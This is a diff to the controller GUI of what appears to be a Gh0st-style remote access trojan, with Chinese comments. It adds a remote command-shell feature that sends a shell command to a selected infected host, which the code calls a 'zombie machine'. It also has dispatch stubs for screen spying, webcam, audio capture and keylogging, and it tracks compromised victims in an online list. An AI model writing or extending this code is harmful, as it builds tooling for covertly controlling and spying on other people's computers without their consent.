@@ -13,6 +13,7 @@
 #include "macros.h"
 #include "Others/macros.h"
 #include "Others/login.h"
+#include "CShellDlg.h"
 
 //using namespace std;
 
@@ -82,7 +83,7 @@ void CUIDlg::LoadUI()
 	InitOnlineListCtrl();
 	InitEventLogListCtrl();
 	InitStatusBar();
-	InitNotify();
+	//InitNotify();
 }
 
 // 主菜单
@@ -171,7 +172,9 @@ void CUIDlg::InitEventLogListCtrl()
 
 
 // 添加内容到列表控件
-void CUIDlg::AddContextListCtrol(CListCtrl &lc, std::initializer_list<LPCTSTR> context)
+void CUIDlg::AddContextListCtrol(CListCtrl &lc,
+								std::initializer_list<LPCTSTR> context,
+								ClientContext *pContext)
 {
 	UINT i = 1;
 
@@ -187,6 +190,11 @@ void CUIDlg::AddContextListCtrol(CListCtrl &lc, std::initializer_list<LPCTSTR> c
 
 		lc.SetItemText(0, i, ctx);
 		++i;
+	}
+
+	if (pContext != nullptr) {
+		// 上线主机的上下文
+		lc.SetItemData(0, (DWORD)pContext);
 	}
 }
 
@@ -233,16 +241,39 @@ CString CUIDlg::GetSystemTime()
 }
 
 
+void CUIDlg::GetLocalIPList(CHAR *pIPList)
+{
+	char szHostName[MAX_PATH] = { 0 },
+		 szBuf[MAX_PATH]      = { 0 },
+		 szAddrList[MAX_PATH] = { 0 };
+
+	ADDRINFOA AddrInfo, *Result = nullptr, *p = nullptr;
+	ZeroMemory(&AddrInfo, sizeof(AddrInfo));
+	AddrInfo.ai_family   = AF_INET;
+	AddrInfo.ai_socktype = SOCK_STREAM;
+	AddrInfo.ai_protocol = IPPROTO_TCP;
+
+	SOCKADDR_IN *pAddr = nullptr;
+
+	gethostname(szHostName, sizeof(szHostName));
+
+	if (!getaddrinfo(szHostName, NULL, &AddrInfo, &Result)) {
+		for (p = Result; p != nullptr; p = p->ai_next) {
+			pAddr = (SOCKADDR_IN *)p->ai_addr;
+			inet_ntop(AF_INET, &pAddr->sin_addr, szBuf, sizeof(szBuf));
+			strncat_s(pIPList, MAX_PATH, szBuf, sizeof(szBuf));
+
+			if (p->ai_next) {
+				strncat_s(pIPList, MAX_PATH, " / ", 3);
+			}
+		}
+	}
+}
+
+
 // 开始网络处理
 void CUIDlg::StartNetwork()
 {
-	char szHostName[MAX_PATH] = { 0 }, 
-		 szBuf[MAX_PATH]	  = { 0 },
-		 szAddrList[MAX_PATH] = { 0 };
-	ADDRINFOA AddrInfo, *Result = nullptr, *p = nullptr;
-	SOCKADDR_IN *pAddr = nullptr;
-	CString strEventLog;
-
 	// 从ini配置文件读取端口、最大连接数
 	CIniFile &IniFile   = ((CUIApp *)AfxGetApp())->m_iniFile;
 	UINT nPort          = (UINT)IniFile.GetInt("Settings", "ListenPort");
@@ -256,35 +287,24 @@ void CUIDlg::StartNetwork()
 
 	/*
 	 * start iocp server
+	 * 
+	 * Initialize(): 初始化网络
+	 * NotifyProc(): 该回调函数accpet网络的连接
 	 */
+	std::initializer_list<LPCTSTR> columns;
 	if (g_iocpServer->Initialize(NotifyProc, NULL, 10000, nPort)) {
-		gethostname(szHostName, sizeof(szHostName));
+		char IPList[MAX_PATH] = {0}; 
+		GetLocalIPList(IPList);
 
-		ZeroMemory(&AddrInfo, sizeof(AddrInfo));
-		AddrInfo.ai_family	 = AF_INET;
-		AddrInfo.ai_socktype = SOCK_STREAM;
-		AddrInfo.ai_protocol = IPPROTO_TCP;
-		if (!getaddrinfo(szHostName, NULL, &AddrInfo, &Result)) {
-			for (p = Result; p != nullptr; p = p->ai_next) {
-				pAddr = (SOCKADDR_IN *)p->ai_addr;
-				inet_ntop(AF_INET, &pAddr->sin_addr, szBuf, sizeof(szBuf));
-				strncat_s(szAddrList, szBuf, sizeof(szBuf));
-
-				if (p->ai_next) {
-					strncat_s(szAddrList, " / ", 3);
-				}
-			}
-		}
-
-		strEventLog.Format("本机IP %s 端口 %d 最大连接数 %d", szAddrList, nPort, nMaxConnection);
-		std::initializer_list<LPCTSTR> context = {"网络初始化", strEventLog};
-		AddContextListCtrol(m_lcEventLog, context);
+		CString strEventLog;
+		strEventLog.Format("本机IP  %s  端口  %d  最大连接数  %d", 
+							IPList, nPort, nMaxConnection);
+		columns = {"网络初始化", strEventLog};
+		AddContextListCtrol(m_lcEventLog, columns, NULL);
 	} else {
-		std::initializer_list<LPCTSTR> context = { "网络初始化失败" };
-		AddContextListCtrol(m_lcEventLog, context);
+		columns = { "网络初始化失败" };
+		AddContextListCtrol(m_lcEventLog, columns, NULL);
 	}
-
-
 }
 
 
@@ -304,10 +324,12 @@ BEGIN_MESSAGE_MAP(CUIDlg, CDialogEx)
 	// 自定义消息处理
 	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd:: *)(WPARAM, LPARAM)) &CUIDlg::OnIconNotify)
 	ON_MESSAGE(WM_ADDONLINE, &CUIDlg::OnAddOnline)
+	ON_MESSAGE(WM_OPENSHELLDIALOG, &CUIDlg::OnOpenShellDlg)
 
 	ON_COMMAND(ID_MAIN_SETTING, &CUIDlg::OnMainSetting)
 	ON_COMMAND(ID_MIAN_CLOSE, &CUIDlg::OnMianClose)
 	ON_NOTIFY(NM_RCLICK, IDC_LIST_ONLINE, &CUIDlg::OnNMRClickListOnline)
+	ON_COMMAND(ID_ONLINE_CMD, &CUIDlg::OnOnlineCmd)
 END_MESSAGE_MAP()
 
 
@@ -352,6 +374,43 @@ void CUIDlg::ProcessReceiveComplete(ClientContext *pContext)
 
 	// 如果管理对话框打开，交给相应的对话框处理
 	CDialog *dlg = (CDialog *)pContext->m_Dialog[1];      //这里就是ClientContext 结构体的int m_Dialog[2];
+
+	// 这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
+	if (pContext->m_Dialog[0] > 0) {
+		switch (pContext->m_Dialog[0])
+		{
+		case FILEMANAGER_DLG:
+			//((CFileManagerDlg *)dlg)->OnReceiveComplete();
+			break;
+
+		case SCREENSPY_DLG:
+			//((CScreenSpyDlg *)dlg)->OnReceiveComplete();
+			break;
+		case WEBCAM_DLG:
+			//((CWebCamDlg *)dlg)->OnReceiveComplete();
+			break;
+
+		case AUDIO_DLG:
+			//((CAudioDlg *)dlg)->OnReceiveComplete();
+			break;
+
+		case KEYBOARD_DLG:
+			//((CKeyBoardDlg *)dlg)->OnReceiveComplete();
+			break;
+
+		case SYSTEM_DLG:
+			//((CSystemDlg *)dlg)->OnReceiveComplete();
+			break;
+
+		case SHELL_DLG:
+			((CShellDlg *)dlg)->OnReceiveComplete();
+			break;
+
+		default:
+			break;
+		}
+		return;
+	}
 
 	//如果没有赋值就判断是否是上线包和打开功能功能窗口
 	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
@@ -411,12 +470,24 @@ void CUIDlg::ProcessReceiveComplete(ClientContext *pContext)
 		break;
 
 	case TOKEN_SHELL_START:
-		//g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
+		// 收到肉机响应的指令
+		g_UIDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
 		break;
 		// 命令停止当前操作
 	default:
 		closesocket(pContext->m_Socket);
 		break;
+	}
+}
+
+// 选中上线的肉机，然后选择相应的控制功能
+void CUIDlg::SendSelectedToken(PBYTE pToken, UINT nSize)
+{
+	POSITION pos = m_lcOnline.GetFirstSelectedItemPosition();
+	if (pos) {
+		int	nItem = m_lcOnline.GetNextSelectedItem(pos);
+		ClientContext *pContext = (ClientContext *)m_lcOnline.GetItemData(nItem);
+		g_iocpServer->Send(pContext, pToken, nSize);
 	}
 }
 
@@ -456,6 +527,8 @@ BOOL CUIDlg::OnInitDialog()
 	GetWindowRect(&r);
 	r.top += 1;
 	MoveWindow(&r);
+
+	ShowWindow(SW_SHOWMAXIMIZED);
 
 	// 开始网络处理
 	StartNetwork();
@@ -519,6 +592,10 @@ HCURSOR CUIDlg::OnQueryDragIcon()
 void CUIDlg::OnSize(UINT nType, int cx, int cy)
 {
 	CDialogEx::OnSize(nType, cx, cy);
+
+	if (nType == SIZE_MINIMIZED) {
+		return;
+	}
 
 	CRect rOnSize;
 
@@ -703,15 +780,31 @@ LRESULT CUIDlg::OnAddOnline(WPARAM wParam, LPARAM lParam)
 		//if (!((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips)
 		//	g_pFrame->ShowToolTips(strToolTipsText);
 
-		std::initializer_list<LPCTSTR> context = { IPAddress, "null", strPCName,
+		std::initializer_list<LPCTSTR> columns = { IPAddress, "null", strPCName,
 											   strOS, strCPU, strVideo, strPing };
-		AddContextListCtrol(m_lcOnline, context);
+		AddContextListCtrol(m_lcOnline, columns, pContext);
 
-		context = {"加载DLL", "server dll is loaded success"};
-		AddContextListCtrol(m_lcEventLog, context);
+		columns = {"肉机上线", "接客啦"};
+		AddContextListCtrol(m_lcEventLog, columns, NULL);
 	} catch (...) {}
 
 	return 0;
+}
+
+// 终端管理
+LRESULT CUIDlg::OnOpenShellDlg(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext *pContext = (ClientContext *)lParam;
+	CShellDlg *dlg = new CShellDlg(this, g_iocpServer, pContext);
+
+	// 非模态方式打开
+	dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = SHELL_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+
+	return LRESULT();
 }
 
 
@@ -752,4 +845,12 @@ void CUIDlg::OnNMRClickListOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	pSub->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
 
 	*pResult = 0;
+}
+
+
+// 终端管理
+void CUIDlg::OnOnlineCmd()
+{
+	BYTE bToken = COMMAND_SHELL;
+	SendSelectedToken(&bToken, sizeof(BYTE));
 }
